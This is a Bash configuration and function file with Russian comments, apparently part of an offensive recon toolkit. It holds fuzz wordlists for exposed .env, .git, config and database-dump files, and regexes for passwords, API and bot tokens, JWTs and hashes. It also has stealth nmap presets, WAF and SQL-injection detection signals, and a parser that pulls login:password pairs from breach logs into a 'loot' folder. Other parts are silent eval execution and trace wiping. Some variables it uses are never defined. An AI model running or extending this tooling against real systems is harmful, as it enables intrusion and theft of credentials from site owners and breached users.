GLOBAL_REGEX_WEB_EXTENSIONS='\b[a-zA-Z0-9_\/\.-]+\.(php|php[0-9]|aspx?|jspx?|pdf|docx?|xlsx?|zip|gz|tar\.gz|tgz|rar|sql|db|sqlite|env|htaccess|htpasswd|bak|old|swp|log|conf|ini|json|ya?ml|git|key|pem|crt)\b'


# ==============================================================================
# 5. СЛОВАРЬ ФАЗЗИНГА ЧУВСТВИТЕЛЬНЫХ ТОЧЕК И АРТЕФАКТОВ (ULTIMATE FUZZ WORDLIST)
# ==============================================================================
GLOBAL_FUZZ_WORDLIST=(
    # --- Ядро окружения и секреты (Environment & Secrets) ---
    ".env"
    ".env.local"
    ".env.production"
    ".env.stage"
    ".env.bak"
    ".env.old"
    "config.env"
    
    # --- Конфигурации и Веб-серверы (Configurations & Web Servers) ---
    ".htaccess"
    ".htpasswd"
    "web.config"
    "nginx.conf"
    "config.php"
    "config.inc.php"
    "config.json"
    "wp-config.php"
    "wp-config.bak"
    "configuration.php"
    "settings.py"
    "application.properties"
    "application.yml"
    
    # --- Репозитории и CI/CD оркестрация (Repositories & CI/CD) ---
    ".git/HEAD"
    ".git/config"
    ".git/index"
    ".gitignore"
    ".svn/entries"
    "docker-compose.yml"
    "Dockerfile"
    ".gitlab-ci.yml"
    "jenkins.xml"
    "package.json"
    
    # --- Дампы баз данных и бэкапы (Database Dumps & Backups) ---
    "backup.sql"
    "database.sql"
    "dump.sql"
    "db.sql"
    "mysql.sql"
    "data.sqlite"
    "backup.zip"
    "backup.tar.gz"
    "backup.rar"
    "site.zip"
    "www.zip"
    "html.zip"
    "archive.zip"
    "config.php.bak"
    "config.php.old"
    "index.php.bak"
    "index.php.old"
    
    # --- Логи и Отладка (Logs, Debugging & Panel Entrances) ---
    "phpinfo.php"
    "info.php"
    "test.php"
    "debug.log"
    "error.log"
    "access.log"
    "laravel.log"
    "pm2.log"
    "cron.log"
    "status"
    "server-status"
)

# ==============================================================================
# @description: Ультимативные сигнатуры для статического анализа (PE/ELF/Logs)
# ==============================================================================
GLOBAL_STATIC_SIGNATURES="(https?|ftp|sftp|ws|wss):\/\/[^\s\"'\`>]+|\/etc\/(passwd|shadow|issue|hostname|resolv\.conf)|\/proc\/(self|net|version)|\b(cmd\.exe|powershell\.exe|sh|bash|zsh|csh|tcsh|wscript\.exe|cscript\.exe|rundll32\.exe|regsvr32\.exe)\b|\b(Authorization|Bearer|X-API-Key|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|token|secret_key|api_key|passwd|password|private_key|id_rsa|ssh-rsa)\b|VirtualAlloc|VirtualProtect|IsDebuggerPresent|CheckRemoteDebuggerPresent|GetProcAddress|LoadLibraryA|system|execve|popen|fork"

# --- Расширенные сигнатуры глубокого анализа (Deep Forensics & OSINT RegEx) ---
# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска пар email:pass и login:pass
# ==============================================================================
GLOBAL_REGEX_CREDENTIALS="(?i)\b([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}|[a-z0-9_.-]{3,32}):[^[:space:]]{3,64}\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации IPv6 (RFC 5952)
# ==============================================================================
GLOBAL_REGEX_IPV6="(?i)\b(((?=(?:.*:){7})[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){7})|((?=(?:.*:){1,6})[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){1,6}|)(?:::(?:[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){1,6}|))|(?:::(?:[0-9a-f]{1,4}(?::[0-9a-f]{1,4}){0,6})?))\b"

# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска и валидации MAC-адресов (IEEE 802)
# Supports: 00:11:22:33:44:55, 00-11-22-33-44-55, 0011.2233.4455, 001122334455
# ==============================================================================
GLOBAL_REGEX_MAC="(?i)\b(([0-9a-f]{2}(:)[0-9a-f]{2}(\4[0-9a-f]{2}){4})|([0-9a-f]{2}(-)[0-9a-f]{2}(\7[0-9a-f]{2}){4})|([0-9a-f]{4}\.[0-9a-f]{4}\.[0-9a-f]{4})|([0-9a-f]{12}))\b"

# ==============================================================================
# @description: Ультимативные паттерны для детекции и сепарации 32-символьных хэшей
# ==============================================================================
# Базовый сырой хэш (строго 32 символа Hex)
GLOBAL_REGEX_HASH_32_HEX="(?i)\b[a-f0-9]{32}\b"

# Сигнатурный контекст MD5: хэширование пустых строк, соли или маркеры бэкенда
GLOBAL_SIG_HASH_MD5_MARKERS="(?i)(md5|password_hash|wp_|user_pass)"

# Сигнатурный контекст NTLM: разделители учетных записей Windows (UID:RID:LM:NTLM)
GLOBAL_SIG_HASH_NTLM_MARKERS=":[0-9a-f]{32}:[0-9a-f]{32}\b|:[a-f0-9]{32}$"


# ==============================================================================
# @description: Ультимативные паттерны криптографии, бот-менеджмента и JWT Intel
# ==============================================================================

# --- Криптография: Хэш-функции и приватные ключи (64 символа Hex) ---
GLOBAL_REGEX_HASH_SHA256="(?i)\b[a-f0-9]{64}\b"
GLOBAL_SIG_CRYPTO_KEY_MARKERS="(?i)(private_key|secret|wallet|priv|privkey|signing)"

# --- Разведка: Токены управления Telegram-ботов (Поддержка ID нового поколения) ---
# Бесшовно обрабатывает ID от 8 до 15 знаков внутри любого текстового массива/JSON
GLOBAL_REGEX_TG_TOKEN="(?i)\b[0-9]{8,15}:[A-Za-z0-9_-]{35}\b"

# --- Разведка: Веб-токены JWT (RFC 7519 Base64URL Strict Compliance) ---
# Гарантирует наличие трех зон (Header.Payload.Signature) без ложных срабатываний
GLOBAL_REGEX_JWT="\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"

# Пример того, как легко ты сможешь масштабировать этот блок в будущем:
GLOBAL_REGEX_DISCORD_TOKEN="\b[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}\b"
GLOBAL_REGEX_AWS_KEY="\bAKIA[A-Z0-9]{16}\b"


# ==============================================================================
# --- 3. ГЛОБАЛЬНЫЕ СУПЕР-КОМПОЗИТЫ (ОПТИМИЗАЦИЯ ПОТОКА) ---
# ==============================================================================
# Проверка одного супер-композита в цикле заменяет собой пачку раздельных проверок

# Объединенный крипто-след (MD5 / NTLM / SHA-256 / Private Keys)
GLOBAL_SUPER_REGEX_CRYPTO="($GLOBAL_REGEX_HASH_32_HEX|$GLOBAL_REGEX_HASH_SHA256)"

# Объединенный шлюз инфраструктурных доступов (JWT / Telegram Bot API)
GLOBAL_SUPER_REGEX_TOKENS="($GLOBAL_REGEX_TG_TOKEN|$GLOBAL_REGEX_JWT)"

# Объединенный сетевой стек (IPv4 / IPv6 / MAC / Domain)
# Настраивается путем слияния твоих базовых сетевых регулярных выражений
GLOBAL_SUPER_REGEX_INFRA="($GLOBAL_REGEX_IP|$GLOBAL_REGEX_MAC|$GLOBAL_REGEX_DOMAIN)"


# --- Сигнатуры эвристического движка анализа уязвимостей (Exploiter Engine Signatures) ---
# ==============================================================================
# 6. СИГНАЛЫ ПРИСУТСТВИЯ WAF И ЗАЩИТНЫХ СИСТЕМ (ULTIMATE WAF CORE)
# ==============================================================================
GLOBAL_SIG_WAF="(?i)(cloudflare|akamai|sucuri|incapsula|imperva|barracuda|f5_big-ip|mod_security|comodo|radware|fortigate|wordfence|asm|citrix|aws-waf|cloudfront|edgesuite|fastly|stackpath|__cfuid|cf-ray|cf-cache-status|x-sucuri-id|x-protected-by|x-waf-|x-cdn|err_connection_refused|captcha-bypass|challenge-platform|429 too many requests|block_id|security_challenge)"

# ==============================================================================
# 7. СИГНАЛЫ СТРУКТУРЫ ДЛЯ АКТИВАЦИИ SQL-ENGINE (ULTIMATE STRUCTURE MATRIX)
# ==============================================================================
GLOBAL_SIG_WEB_STRUCTURE="(?i)(\b(id|uid|uuid|p|page|cat|category|sec|section|art|article|post|prod|product|item|file|doc|lang|action|act|mode|view|search|q|query|sort|order|by|limit|offset|from|to|start|end|file_id|user_id|group_id|token_id|hash|data|payload|json|xml|ajax)\b\s*=|(\/api\/(v[0-9]|v1|v2|v3)\/[a-zA-Z0-9_-]+\/[0-9]+)|\b(select|insert|update|delete|drop|alter|union|where|having|orderby|groupby|into|load_file|benchmark|sleep|md5|sha1|concat)\b|\b(graphql|query\s*\{|\"query\"\s*:|mutation\b|\$gql))"


# ==============================================================================
# 8. СИГНАЛЫ ВЫЯВЛЕНИЯ КРИТИЧЕСКИХ АНОМАЛИЙ И УЯЗВТИМОСТЕЙ (ULTIMATE ALERTS)
# ==============================================================================
GLOBAL_SIG_VULN_ALERTS="(?i)(\b(vulnerable|exploit_matched|rce_triggered|shell_spawned|privilege_escalation|unauthenticated|auth_bypass|remote_code_execution|buffer_overflow|segmentation_fault|core_dumped|access_denied|permission_denied)\b|\bcve-[0-9]{4}-[0-9]{4,7}\b|\b(sql_error|syntax_error|mariadb|postgresql|sqlite|oracle_error|unhandled_exception|stack_trace|fatal_error|null_pointer)\b|\b(lfi|rfi|ssrf|xxe|deserialization|command_injection|path_traversal)\b)"


# --- Сигнатуры для сбора информации и разведки вебхуков (Recon & Webhook Signatures) ---
# ==============================================================================
# 9. СИГНАТУРЫ АКТИВНЫХ ИНТЕРПРЕТАТОРОВ И СЛУЖБ (ULTIMATE RUNTIMES MATRIX)
# ==============================================================================
GLOBAL_SIG_WEB_RUNTIMES="(?i)\b(python([0-9](\.[0-9]+)?)?|node([0-9]+)?|php(-fpm)?([0-9](\.[0-9]+)?)?|go|ruby([0-9](\.[0-9]+)?)?|java|perl|dotnet|nginx|apache[0-9]?|httpd|lighttpd|caddy|traefik|gunicorn|uwsgi|puma|unicorn|passenger|tomcat|jetty|wildfly|glassfish|docker(-containerd|-current)?|dockerd|podman|containerd|kubelet|hypercorn|uvicorn|daphne)\b"


# ==============================================================================
# 10. СЛОВАРЬ ФАЗЗИНГА ВЕБХУКОВ И API ЭНДПОИНТОВ (ULTIMATE WEBHOOK WORDLIST)
# ==============================================================================
GLOBAL_WEBHOOK_WORDLIST=(
    # --- Версионированные API и Точки Входа (Core API Routs) ---
    "api"
    "api/v1"
    "api/v2"
    "api/v3"
    "api/v4"
    "rest/v1"
    "rest/v2"
    "v1/api"
    "v2/api"
    "graphql"
    "api/graphql"
    
    # --- Универсальные Вебхуки (Generic Webhooks) ---
    "webhook"
    "webhooks"
    "hooks"
    "hook"
    "api/webhook"
    "api/webhooks"
    "api/hooks"
    "v1/webhooks"
    "v2/webhooks"
    "webhooks.json"
    "webhook.php"
    
    # --- Мессенджеры и Чат-боты (Messengers & Bots) ---
    "tg-hook.php"
    "telegram-webhook"
    "telegram/webhook"
    "api/telegram"
    "slack-hook"
    "slack/webhook"
    "api/slack"
    "discord-webhook"
    "discord/webhook"
    "teams-webhook"
    
    # --- Финансовые и Платежные Шлюзы (FinTech & Payment Gateways) ---
    "stripe-webhook"
    "stripe/webhook"
    "api/stripe"
    "paypal-webhook"
    "paypal/webhook"
    "api/paypal"
    "braintree-webhook"
    "razorpay-webhook"
    "shopify-webhook"
    "shopify/webhook"
    
    # --- Разработка, CI/CD и Облака (DevOps & Cloud Providers) ---
    "git-hook"
    "github-webhook"
    "github/webhook"
    "gitlab-webhook"
    "gitlab/webhook"
    "bitbucket-webhook"
    "jenkins-webhook"
    "jira-webhook"
    "aws-webhook"
    "firebase-webhook"
    
    # --- CRM, Маркетинг и Телефония (SaaS, Marketing & Telephony) ---
    "mailchimp-webhook"
    "sendgrid-webhook"
    "twilio-webhook"
    "twilio/webhook"
    "hubspot-webhook"
    "hubspot/webhook"
    "amocrm-webhook"
    "bitrix-webhook"
)


# ==============================================================================
# @description: Ультимативный паттерн поиска скрытых сетей и Web3-маршрутов
# ==============================================================================
GLOBAL_REGEX_DARKWEB="(?i)(\b[a-z2-7]{56}\.onion\b|\b[a-z0-9]{52}\.b32\.i2p\b|\b[a-z0-9_-]+\.i2p\b|\b[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}\b|(\.bit|\.lib|\.coin|\.bazar|\.emc|\.onion|\.i2p|\.ygg)\b)"


# ==============================================================================
# SYSTEM CORE: СИСТЕМНЫЕ ЛИМИТЫ И ИНТЕРФЕЙСЫ БЕЗОПАСНОСТИ
# ==============================================================================

# Динамический регулятор числовых диапазонов меню (Лимит по умолчанию)
# Используется как дефолтный extra-параметр для валидатора "range"
GLOBAL_CORE_MENU_MAX_LIMIT=99

# ==============================================================================
# @description: Ультимативная матрица валидации защищенных интерфейсов (Privacy Layer)
# Защищает ядро от False Positive совпадений и покрывает стек протоколов 2026 года.
# ==============================================================================
GLOBAL_REGEX_PRIVACY_INTERFACES="(?i)\b(tun[0-9]*|ppp[0-9]*|wg[0-9]*|wireguard[0-9]*|tap[0-9]*|csc[0-9]*|fct[0-9]*|forti[a-z]*|nordlynx|xvpn|tailscale[0-9]*|zt[0-9]*|zerotier|proton[a-z]*|anyconnect|sing-?tun|clash-?tun|xray-?tun|vtun[0-9]*)\b"

# ==============================================================================
# SYSTEM CORE: АТОМАРНЫЕ СИСТЕМНЫЕ И ЛОГИЧЕСКИЕ ВАЛИДАТОРЫ
# ==============================================================================
# Строгая проверка на чистое положительное целое число (Integer)
GLOBAL_REGEX_DIGIT="^[0-9]+$"



# ==============================================================================
# @description: Ультимативная супер-матрица инфраструктурной разведки (OSINT Layer)
# Мультиязычный бронированный композит для снайперского парсинга WHOIS-данных.
# Покрывает международные, национальные (ccTLD) и новые (gTLD) зоны по состоянию на 2026 год.
# ==============================================================================
GLOBAL_SIG_WHOIS_MATRIX="(?i)(registrar|reg-name|sponsoring|org|organization|registrant|admin[-_ ]city|admin[-_ ]country|country|c:|co:|expires|expired|exp-date|paid-till|validity|free-date|created|creation[-_ ]date|registered|reg-date|changed|modified|updated|nserver|name[-_ ]server|ns[0-9]*|person|descr|tech-id|mnt-by|status|state|registrant[-_ ]email|e-mail|privat[a-z]*|protect[a-z]*|gdpr|redacted|anonymous)"


# ==============================================================================
# OSINT CORE: УЛЬТИМАТИВНЫЕ МАТРИЦЫ АНАЛИЗА HTTP/HTTPS И СЕТЕВЫХ ЗАГОЛОВКОВ
# Максимально полный мультиязычный стек паттернов для глубокой разведки (2026)
# ==============================================================================

# 1. Матрица определения серверного ПО и балансировщиков (Инфраструктурный слой)
# Перехватывает не только классический Server, но и прокси, шлюзы, CDN и контроллеры ingress
GLOBAL_REGEX_HTTP_SERVER="(?i)^(server|via|x-asf-by|x-powered-by-plesk|x-advertising|x-responder|x-served-by|x-cached-by|x-cache|x-edge-location|x-amz-server-side-encryption|x-kong-proxy-latency|x-envoy-upstream-service-time|cf-ray|kiwi-id)"

# 2. Матрица версий, фреймворков и бэкенд-сред выполнения (Runtime Layer)
# Содержит маркеры CMS, языков программирования, фреймворков, шаблонизаторов и серверов приложений
GLOBAL_REGEX_HTTP_RUNTIME="(?i)^(x-powered-by|x-runtime|x-version|x-aspnet-version|x-aspnetmvc-version|x-cocoa-version|x-generator|x-cms|x-nextjs-cache|x-nuxt-cache|x-redirected-by|x-framework|x-application-context|wp-super-cache|x-drupal-cache|x-varnish)"

# 3. Ультимативная матрица аудита заголовков безопасности и приватности (Security Shield)
# Покрывает все современные политики контроля доступа, изоляции контекста и защиты от эксплуатации
GLOBAL_REGEX_HTTP_SECURITY="(?i)^(content-security-policy|content-security-policy-report-only|x-frame-options|x-content-type-options|strict-transport-security|x-xss-protection|x-permitted-cross-domain-policies|referrer-policy|permissions-policy|clear-site-data|cross-origin-embedder-policy|cross-origin-opener-policy|cross-origin-resource-policy|expect-ct|access-control-allow-origin|access-control-allow-credentials|access-control-allow-headers|access-control-allow-methods)"

# 4. Матрица детекции служебных параметров, статус-кодов и сетевого состояния
GLOBAL_REGEX_HTTP_STATUS="(?i)^http/"

# ==============================================================================
# OSINT CORE: УЛЬТИМАТИВНАЯ МАТРИЦА СЕССИОННЫХ ДЕСКРИПТОРОВ (Cookie & Session Layer)
# Максимально полный перехват векторов авторизации, трекеров и сессионных токенов.
# Покрывает стандарты RFC 6265, JWT, OAuth, а также кастомные заголовки WAF/CDN (2026).
# ==============================================================================
GLOBAL_REGEX_HTTP_COOKIE="(?i)^(set-cookie|cookie|cookie2|x-xsrf-token|x-csrf-token|authorization|proxy-authorization|x-auth-token|x-session-id|x-request-id|cf-mitm-auth|cf-access-authenticated-user-email|x-amz-security-token|x-amzn-trace-id|ak_bmsc|bm_sv)"


# ==============================================================================
# OSINT WHOIS LAYER: АТОМАРНЫЕ СУПЕР-МАТРИЦЫ ИНФРАСТРУКТУРНОЙ РАЗВЕДКИ
# Полноценная изоляция текстовых шаблонов для мультиязычного парсинга (2026)
# ==============================================================================

# 1. Данные регистратора, организаций, провайдеров и ответственных лиц
GLOBAL_REGEX_WHOIS_REG="(registrar|reg-name|sponsoring|org|organization|registrant|person|descr|tech-id|mnt-by)"

# 2. Метки жизненного цикла инфраструктуры (Временные маркеры и даты)
GLOBAL_REGEX_WHOIS_DATES="(expires|expired|exp-date|paid-till|validity|free-date|created|creation[-_ ]date|registered|reg-date|changed|modified|updated)"

# 3. Маршрутизация DNS-серверов и узлов делегирования трафика
GLOBAL_REGEX_WHOIS_NS="(nserver|name[-_ ]server|ns[0-9]*)"

# 4. Детекция слоев приватности, GDPR-заглушек и обфускации владельца
GLOBAL_REGEX_WHOIS_PRIVACY="(privat[a-z]*|protect[a-z]*|gdpr|redacted|anonymous)"

# Сводный композит для первичной фильтрации потока (Объединяет все атомарные матрицы)
GLOBAL_SIG_WHOIS_MATRIX="(?i)(${GLOBAL_REGEX_WHOIS_REG}|${GLOBAL_REGEX_WHOIS_DATES}|${GLOBAL_REGEX_WHOIS_NS}|${GLOBAL_REGEX_WHOIS_PRIVACY})"


# ==============================================================================
# FORENSIC & PURGE LAYER: ГЛОБАЛЬНЫЕ МАТРИЦЫ АВТОНОМНОЙ ЗАЩИТЫ (УЛЬТИМАТИВНЫЕ)
# Максимально полный стек регулярных паттернов для Incident Response и зачистки (2026)
# ==============================================================================

# 1. Строгие паттерны детекции аномальных, зависших и деструктивных статусов процессов
# Z (Zombie), D (Uninterruptible Sleep / Вредоносный I/O или Лок), T (Stopped), t (Traced / Отладка под малварью)
GLOBAL_REGEX_BAD_PROC_STATUS="^[ZDTt]$"

# 2. Индустриальный белый список процессов, критической инфраструктуры и системных демонов
# ЗАПРЕЩЕНО трогать во избежание мгновенного краха ядра OS, SSH-сессий, контейнеров и шины управления
GLOBAL_REGEX_PROC_WHITELIST="(?i)^(systemd|init|sshd|bash|sh|zsh|tmux|screen|adb|dockerd|containerd|podman|kthreadd|kworker.*|ksoftirqd.*|migration.*|rcu_sched|auditd|rsyslogd|systemd-journald|dbus-daemon|udevd|agetty|login)$"

# 3. Максимальная матрица вредоносных, теневых и атакующих портов (Danger Network Perimeter)
# Покрывает: Метасплоит, дефолтные RAT, криптомайнеры, бэкдоры, туннели (Ngrok/Chisel) и командные центры (C2)
GLOBAL_REGEX_DANGER_PORTS="^(4444|55555|6666|7777|8888|9999|31337|1337|9001|8080|4443|65534|2022|8000|1080|5000|54321|4000|4545|8333|14337)$"

# 4. Белый список портов управления, жизнеобеспечения и авторизованного доступа
# Блокировка этих портов гарантирует моментальную потерю контроля над целевой системой (22: SSH, 80/443: Web, 5037/5555: ADB шина)
GLOBAL_REGEX_PORT_WHITELIST="^(22|80|443|5037|5555|2376|6443|9100)$"

# 5. Ультимативная сигнатурная маска критических системных файлов, баз данных и логов
# ЗАПРЕЩЕНО перемещать в карантин, так как их удаление/блокировка разрушит ОС или затрет форензик-след для суда
GLOBAL_REGEX_QUARANTINE_WHITELIST="(?i)\.(conf|lock|uuid|db|sqlite|passwd|shadow|journal|log|key|crt|pem|fstab|modules|enviroment)$"


# ==============================================================================
# NETWORK INTELLIGENCE LAYER: ГЛОБАЛЬНЫЕ МАТРИЦЫ СЕТЕВОГО АУДИТА (УЛЬТИМАТИВНЫЕ)
# Конфигурация гибридного сканирования, обхода систем фильтрации и OSINT-топологии
# ==============================================================================

# 1. Отказоустойчивый резервный диапазон (Дефолтная маска внутренней инфраструктуры)
GLOBAL_NET_FALLBACK_RANGE="192.168.1.0/24"

# 2. ПРИВИЛЕГИРОВАННЫЙ РЕЖИМ ЯДРА (ROOT-ДОСТУП) — МАКСИМАЛЬНЫЙ СТЕК АТАК
# Конфигурация «STEALTH & COMPREHENSIVE»: Трассировка пакетов, SYN-скан (-sS), 
# определение ОС (-O), версий софта (-sV), агрессивный тайминг (-T4) и обход IDS.
GLOBAL_NMAP_ROOT_ARGS="-sS -sV -O -p22,80,443,4444,5555,8080 -T4 -n --max-retries 2 --packet-trace"

# Конфигурация «TOTAL DESTROYER»: Тотальный аудит всех 65535 портов с UDP-разведкой (-sU)
GLOBAL_NMAP_ROOT_DEEP_ARGS="-sS -sU -sV -p- -T4 -Pn -n --disable-arp-ping --randomize-hosts"


# 3. БЕСПРАВНЫЙ РЕЖИМ ЯДРА (NON-ROOT / TERMUX / SAMSUNG A14)
# Конфигурация «FAST LIVE DETECT»: Обход ICMP-блокировок. TCP Connect-скан (-sT) 
# по ключевым портам управления, работающий через стандартные системные сокеты.
GLOBAL_NMAP_NON_ROOT_ARGS="-sT -p22,80,443,5555,8080 -T4 -n --unprivileged --open"

# Конфигурация «NON-ROOT EXTENDED»: Глубокий аудит портов без Root-прав с определением баннеров сервисов
GLOBAL_NMAP_NON_ROOT_DEEP_ARGS="-sT -sV --top-ports 100 -T4 -Pn -n --unprivileged"

# Интервал паузы (в секундах) между циклами автономного сканирования периметра
GLOBAL_NET_AUTONOMOUS_DELAY=300

# 4. СИГНАТУРНЫЕ ФИЛЬТРЫ ОЧИСТКИ ТЕКСТОВОГО ПОТОКА NMAP
# Паттерны для снайперского парсинга вывода во избежание засорения консоли лаунчера
GLOBAL_REGEX_NET_REPORT="(?i)Nmap scan report for"
GLOBAL_REGEX_NET_PORT_LINE="^[0-9]+/(tcp|udp)"


# ==============================================================================
# NETWORK & FORENSIC FILTERS: ГЛОБАЛЬНЫЕ МАТРИЦЫ ИЗОЛЯЦИИ ТРАФИКА
# ==============================================================================

# Ультимативная маска для детекции и отсечения всего диапазона Loopback (Localhost)
# Блокирует адреса от 127.0.0.1 до 127.255.255.255 на любых интерфейсах
GLOBAL_REGEX_NET_LOOPBACK="127\.[0-9]+\.[0-9]+\.[0-9]+"


# ==============================================================================
# @description: Системный движок глубокого анализа и парсинга логов/артефактов
# ==============================================================================
core_engine_parse_target_log() {
    local log_file="$1"
    
    # Проверка физического существования целевого объекта анализа
    if [[ ! -f "$log_file" ]]; then
        core_engine_ui "e" "Критическая ошибка: Файл '$log_file' не найден или недоступен."
        return 1
    fi

    clear
    core_engine_ui "h" "CORE PARSER: ARTIFACT & FORENSICS ENGINE"
    core_engine_ui "i" "Цель анализа: $(basename "$log_file")"
    core_engine_ui "line" ""
    
    # Используем новый однострочный прогресс ядра
    core_engine_progress 2 "STARTING_DEEP_PARSING"
    sleep 1

    # Создаем изолированный файл для сохранения извлеченных учетных данных в loot-директорию
    local log_name=$(basename "$log_file" | sed 's/\.[^.]*$//')
    local creds_loot_file="$BASE_DIR/loot/${log_name}_extracted_creds.txt"
    mkdir -p "$BASE_DIR/loot"

    core_engine_ui "i" "Сканирование структуры на критические маркеры..."

    # --- 1. АНАЛИЗ СЕКРЕТОВ: ТОКЕНЫ TELEGRAM ---
    local tg_tokens
    tg_tokens=$(grep -oE "$GLOBAL_REGEX_TG_TOKEN" "$log_file" | sort -u)
    if [[ -n "$tg_tokens" ]]; then
        local count_tg=$(echo "$tg_tokens" | wc -l)
        core_engine_ui "w" "ОБНАРУЖЕНО КРИТИЧЕСКИХ ТОКЕНОВ TELEGRAM: $count_tg"
        echo -e "${R}$tg_tokens${NC}\n"
    fi

    # --- 2. АНАЛИЗ КРИПТОГРАФИИ: ХЭШИ MD5 ---
    local md5_hashes
    md5_hashes=$(grep -oE "$GLOBAL_REGEX_HASH_MD5" "$log_file" | sort -u)
    if [[ -n "$md5_hashes" ]]; then
        local count_md5=$(echo "$md5_hashes" | wc -l)
        core_engine_ui "s" "Найдены хэш-сигнатуры MD5: $count_md5 объектов."
    fi

    # --- 3. АНАЛИЗ КРИПТОГРАФИИ: ХЭШИ SHA-256 ---
    local sha_hashes
    sha_hashes=$(grep -oE "$GLOBAL_REGEX_HASH_SHA256" "$log_file" | sort -u)
    if [[ -n "$sha_hashes" ]]; then
        local count_sha=$(echo "$sha_hashes" | wc -l)
        core_engine_ui "s" "Найдены хэш-сигнатуры SHA-256: $count_sha объектов."
    fi

    # --- 4. СЕТЕВОЙ УРОВЕНЬ: IPV6 И MAC АДРЕСА ---
    local ipv6_addresses=$(grep -oE "$GLOBAL_REGEX_IPV6" "$log_file" | sort -u)
    local mac_addresses=$(grep -oE "$GLOBAL_REGEX_MAC" "$log_file" | sort -u)
    
    if [[ -n "$ipv6_addresses" || -n "$mac_addresses" ]]; then
        local count_ip=$(echo "$ipv6_addresses" | grep -v '^$' | wc -l || echo 0)
        local count_mac=$(echo "$mac_addresses" | grep -v '^$' | wc -l || echo 0)
        core_engine_ui "i" "Сетевые следы: Обнаружено IPv6 ($count_ip), MAC-адресов ($count_mac)."
    fi

    # --- 5. УЧЕТНЫЕ ДАННЫЕ: EMAIL/LOGIN:PASSWORD (Парсинг COMB) ---
    grep -oE "$GLOBAL_REGEX_CREDENTIALS" "$log_file" | sort -u > "$creds_loot_file"
    local count_creds=$(grep -c "^" "$creds_loot_file" || echo 0)

    # --- 6. ИТОГОВЫЙ СИСТЕМНЫЙ ОТЧЕТ В КОНСОЛЬ ---
    core_engine_ui "line" ""
    core_engine_ui "s" "ГЛУБОКИЙ СТАТИЧЕСКИЙ АНАЛИЗ ЗАВЕРШЕН"
    core_engine_ui "line" ""
    
    echo -e "${B}Файл базы данных лога:${NC} $log_file"
    echo -e "${Y}Извлечено учетных записей:${NC} $count_creds пар(ы) логин:пароль."
    
    if (( count_creds > 0 )); then
        core_engine_ui "s" "Артефакты успешно экспортированы в защищенное хранилище:"
        echo -e "${G}📂 Path: $creds_loot_file${NC}"
        core_engine_loot "parser" "Парсинг $log_name завершен. Извлечено записей: $count_creds"
    else
        rm -f "$creds_loot_file"
    fi
    
    core_engine_ui "line" ""
    core_engine_wait
}



# ==========================================
# 1. CORE ENGINE (Должны быть ПЕРВЫМИ)
# ==========================================

# Core Engine: Базовый UI-маркер
# Эвристически определяет тип сообщения по первому символу (+, !, ?)
core_engine_ui() {
    case "$1" in
        "h") echo -e "\n${B}>>> ${W}$2 ${B}<<<${NC}" ;;
        "i") echo -e "${B}[i]${NC} $2" ;;
        "s") echo -e "${G}[+]${NC} $2" ;;
        "e") echo -e "${R}[-]${NC} $2" ;;
        "line") echo -e "${B}---------------------------------------${NC}" ;;
    esac
}


# Core Engine: Эвристическое удаление
# Автоматически выбирает между -f и -rf, подавляя весь вывод
core_engine_remove() {
    # Эвристика: если объект — директория, используем -rf, иначе -f
    for item in "$@"; do
        if [ -d "$item" ]; then
            rm -rf "$item" 2>/dev/null
        else
            rm -f "$item" 2>/dev/null
        fi
    done
}

# Core Engine: Динамический исполнитель
# Сама решает: выводить результат или работать в режиме "стелс"
core_engine_exec() {
    local cmd="$1"
    local mode="${2:-silent}" # По умолчанию — полная тишина

    if [[ "$mode" == "silent" ]]; then
        eval "$cmd" >/dev/null 2>&1
    else
        eval "$cmd"
    fi
}


# Core Engine: Стерилизация окружения
# Использует встроенную логику удаления для очистки следов сессии
core_engine_clean_env() {
    local cache_targets=(
        "/root/.cache/zcompdump*"
        "/root/.zcompdump*"
        "${HOME}/.cache/zcompdump*"
    )
    
    # Просто вызываем наш универсальный модуль
    core_engine_remove "${cache_targets[@]}"
}


# --- Инициализация системы ---

# Core Engine: Отрисовка элемента интерфейса
# Автоматически подбирает цвет ключа и форматирует строку
core_engine_item() {
    local key="$1"
    local title="$2"
    local desc="${3:-}" # Эвристика: если описания нет, переменная просто пустая

    # 1. Эвристика цвета: R для выхода/назад, Y для инфо, G для остального
    # Используем регулярные выражения для мгновенного схлопывания case
    local k_color=$G
    [[ "$key" =~ ^(b|x|q|exit|back)$ ]] && k_color=$R
    [[ "$key" =~ ^(i|info)$ ]] && k_color=$Y

    # 2. Формирование и вывод в одну строку для максимальной скорости
    # Конструкция ${desc:+ - $desc} добавит дефис и описание только если desc не пуст
    echo -e "  ${k_color}${key})${NC} [${B}${title}${NC}]${desc:+ - $desc}"
}


# Core Engine: Универсальный захват данных
# Автоматически форматирует приглашение и поддерживает скрытый ввод
core_engine_input() {
    local label="$1"
    local hint="$2"
    local var_value
    local cmd="read -r"

    # 1. Эвристика цвета метки (синхронизация с core_engine_item)
    local l_color=$G
    [[ "$label" =~ ^(b|x|q|exit|back)$ ]] && l_color=$R
    [[ "$label" =~ ^(i|info)$ ]] && l_color=$Y

    # 2. Эвристика скрытого ввода (если в подсказке есть "pass" или "key")
    [[ "${hint,,}" =~ (pass|key|secret) ]] && cmd="read -rs"

    # 3. Отрисовка поля (направляем в stderr, чтобы не засорять результат функции)
    echo -ne "  ${l_color}${label})${NC} [${B}${hint}${NC}] ${Y}>> ${NC}" >&2
    
    # 4. Исполнение захвата
    $cmd var_value
    
    # 5. Возврат значения (и перенос строки для скрытого режима)
    [[ "$cmd" == "read -rs" ]] && echo "" >&2
    echo "$var_value"
}



# Core Engine: Тихий запуск команд
# Выполняет задачу без вывода, возвращая только статус завершения
core_engine_run() {
    # Используем "$@" для корректной передачи аргументов с пробелами
    # Перенаправляем stdout и stderr в /dev/null
    "$@" > /dev/null 2>&1
    
    # Возвращаем реальный код выхода команды для последующих проверок
    return $?
}




# Core Engine: Ожидание действия пользователя
